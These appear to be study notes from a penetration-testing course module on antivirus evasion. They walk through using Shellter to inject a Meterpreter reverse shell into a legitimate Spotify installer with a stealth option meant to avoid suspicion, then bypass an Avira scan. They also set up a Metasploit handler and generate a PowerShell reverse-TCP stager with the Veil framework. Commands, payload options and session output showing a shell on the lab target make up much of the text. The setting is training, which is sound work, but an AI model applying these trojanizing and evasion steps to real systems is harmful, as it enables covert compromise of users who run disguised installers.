Now that we have learned how to manually evade an AV via PowerShell, let's explore how to automate AV evasion payloads

_Shellter_ is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software
+ It uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload

While the details of the techniques Shellter uses are beyond the scope of this Module, it essentially performs a thorough analysis of the target PE file and the execution paths
+ It then determines where it can inject our shellcode without relying on traditional injection techniques that are easily caught by AV engines
+ Those include changing of PE file section permissions, creating new sections, etc

Finally, Shellter attempts to use the existing PE _Import Address Table_ (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload
+ A Shellter Pro paid version that supports both 32 and 64-bit binaries, which includes stealthier anti-AV features, is also available.

With a little bit of theory behind us, let's attempt to bypass our current Avira antivirus software using Shellter. We can install Shellter in Kali using the **apt** command.
```
kali@kali:~$ apt-cache search shellter
shellter - Dynamic shellcode injection tool and dynamic PE infector

kali@kali:~$ sudo apt install shellter
...
```

Since Shellter is designed to be run on Windows operating systems, we will also install _wine_, a compatibility layer capable of running win32 applications on several _POSIX-compliant_ operating systems.
```
kali@kali:~$ sudo apt install wine
...

root@kali:~# dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```

Once everything is installed, running the **shellter** command in the local Kali terminal will provide us with a new console running under wine
![[Pasted image 20231025154036.png]]
Shellter can run in either _Auto_ or _Manual_ mode
+ In Manual mode, the tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level
	+ We can use this mode to highly customize the injection process in case the automatically selected options fail
+ For the purposes of this example however, we will run Shellter in Auto mode by selecting **A** at the prompt

Next, we must select a target PE
+ Shellter will analyze and alter the execution flow to inject and execute our payload
+ For this example, we will use the Windows 32-bit trial executable installer for the popular music player _Spotify_ as our target PE
	+ At time of this writing, Spotify offers only the 32-bit Windows version of the installer
	+ For real engagements, it is best practice to pick a new, less scrutinized application as Shellter's author explains

To start, we'll need to tell Shellter the Spotify installer location on our local Kali machine
+ In this case, it is **/home/kali/desktop/spotifysetup.exe**. Before analyzing and altering the original PE in any way, Shellter will first create a backup of the file
![[Pasted image 20231031092939.png]]

As soon as Shellter finds a suitable place to inject our payload, it will ask us if we want to enable _Stealth Mode_, which will attempt to restore the execution flow of the PE after our payload has been executed. Let's enable Stealth Mode as we would like the Spotify installer to behave normally in order to avoid any suspicion
![[Pasted image 20231031093245.png]]
+ Note that in order to restore the execution flow through the Stealth Mode option, custom payloads need to terminate by exiting the current thread
+ After some testing, it seems that any non-Meterpreter payload fails to be executed correctly under Windows 11 and thus, we'll need to resort to Meterpreter-based payloads
+ At this stage, we should not worry too much about the differences between standard and Meterpreter payloads as we are going to learn about those in an upcoming Module

In order to test Shellter's bypass capabilities, we will use the Meterpreter version of the reverse shell payload that Avira detected at the beginning of this Module
+ After submitting **L** for _listed payloads_, we'll select the first payload
+ We are then presented with the default options from Metasploit, such as the reverse shell host (_LHOST_) and port (_LPORT_), which we should fill with our local Kali's IP address and listening port
![[Pasted image 20231031093442.png]]

With all of the parameters set, Shellter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload
![[Pasted image 20231031093536.png]]

Now that the test has succeeded, before transferring over the malicious PE file to our Windows client, we will configure a listener on our Kali machine to interact with the Meterpreter payload
+ We can accomplish this with the following one-liner, remembering to replace the IP address with the one on our Kali box
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

Next, we will transfer the backdoored Spotify installer over to the target Windows 11 client and launch an Avira Quick Scan as we did previously.
![[Pasted image 20231031093634.png]]

Avira's Quick Scan performs a check inside every user's common folder, including the Desktop folder

Since Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE, Avira's signature-based scan runs cleanly. It does not consider the binary malicious
+ Once we execute the file, we are presented with the default Spotify installation window, which under normal circumstances will download the Spotify package over the internet
+ Because our VM has no internet connection, the Spotify installer will hang indefinitely

Reviewing our multi/handler window, it shows that we successfully received a Meterpreter shell
```
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
[*] Sending stage (175174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...

meterpreter > shell
Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
(c) Microsoft Corporation. All rights reserved.

C:\Users\offsec\Desktop>whoami
whoami
client01\offsec
```
+ We've launched an interactive Windows shell session and verified that we actually landed on the target machine as the _offsec_ user

#### Veil Framework 

The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on the open source **Veil framework** to help us automate this process
![[Screenshot 2023-11-02 at 2.11.05 PM.png]]
+ Will use the evasion tools using `use 1`
+ can then list available payloads with `list`:
```
 [*] Available Payloads:

	1)	autoit/shellcode_inject/flat.py

	2)	auxiliary/coldwar_wrapper.py
	3)	auxiliary/macro_converter.py
	4)	auxiliary/pyinstaller_wrapper.py

	5)	c/meterpreter/rev_http.py
	6)	c/meterpreter/rev_http_service.py
	7)	c/meterpreter/rev_tcp.py
	8)	c/meterpreter/rev_tcp_service.py

	9)	cs/meterpreter/rev_http.py
	10)	cs/meterpreter/rev_https.py
	11)	cs/meterpreter/rev_tcp.py
	12)	cs/shellcode_inject/base64.py
	13)	cs/shellcode_inject/virtual.py

	14)	go/meterpreter/rev_http.py
	15)	go/meterpreter/rev_https.py
	16)	go/meterpreter/rev_tcp.py
	17)	go/shellcode_inject/virtual.py

	18)	lua/shellcode_inject/flat.py

	19)	perl/shellcode_inject/flat.py

	20)	powershell/meterpreter/rev_http.py
	21)	powershell/meterpreter/rev_https.py
	22)	powershell/meterpreter/rev_tcp.py
	23)	powershell/shellcode_inject/psexec_virtual.py
	24)	powershell/shellcode_inject/virtual.py

	25)	python/meterpreter/bind_tcp.py
	26)	python/meterpreter/rev_http.py
	27)	python/meterpreter/rev_https.py
	28)	python/meterpreter/rev_tcp.py
	29)	python/shellcode_inject/aes_encrypt.py
	30)	python/shellcode_inject/arc_encrypt.py
	31)	python/shellcode_inject/base64_substitution.py
	32)	python/shellcode_inject/des_encrypt.py
	33)	python/shellcode_inject/flat.py
	34)	python/shellcode_inject/letter_substitution.py
	35)	python/shellcode_inject/pidinject.py
	36)	python/shellcode_inject/stallion.py

	37)	ruby/meterpreter/rev_http.py
	38)	ruby/meterpreter/rev_https.py
	39)	ruby/meterpreter/rev_tcp.py
	40)	ruby/shellcode_inject/base64.py
	41)	ruby/shellcode_inject/flat.py
```
+ Can use a payload using `use <PAYLOAD_NUMBER>`
+ The `powershell/meterpreter/rev_tcp.py` payload will generate a `.bat` file incorporating the powershell payload, and can use it with `use 22`
```
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 Payload Information:

	Name:		Pure PowerShell Reverse TCP Stager
	Language:	powershell
	Rating:		Excellent
	Description:    pure windows/meterpreter/reverse_tcp stager, no
	                shellcode

Payload: powershell/meterpreter/rev_tcp selected

 Required Options:

Name            	Value   	Description
----            	-----   	-----------
BADMACS         	FALSE   	Checks for known bad mac addresses
DOMAIN          	X       	Optional: Required internal domain
HOSTNAME        	X       	Optional: Required system hostname
LHOST           	        	IP of the Metasploit handler
LPORT           	4444    	Port of the Metasploit handler
MINBROWSERS     	FALSE   	Minimum of 2 browsers
MINPROCESSES    	X       	Minimum number of processes running
MINRAM          	FALSE   	Require a minimum of 3 gigs of RAM
PROCESSORS      	X       	Optional: Minimum number of processors
SLEEP           	X       	Optional: Sleep "Y" seconds, check if accelerated
USERNAME        	X       	Optional: The required user account
USERPROMPT      	FALSE   	Window pops up prior to payload
UTCCHECK        	FALSE   	Check that system isn't using UTC time zone
VIRTUALPROC     	FALSE   	Check for known VM processes

 Available Commands:

	back        	Go back to Veil-Evasion
	exit        	Completely exit Veil
	generate    	Generate the payload
	options     	Show the shellcode's options
	set         	Set shellcode option
```
+ Will then set the required LPORT and LHOST information with `set LPORT <PORT>` and `set LHOST <IP>`
+ Then will run `generate` to get the payload:
```
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [>] Please enter the base name for output files (default is payload): payload
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/payload1.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload1.rc

Hit enter to continue...
```
+ After setting the payload name, can retrieve the Metasploit Resource file and Source code in the specified location 
+ To start the handler, will run `msfconsole` and then `resource <METASPLOIT_RESOURCE_FILE>`
+ Can now deploy the payload via the scenario that is available 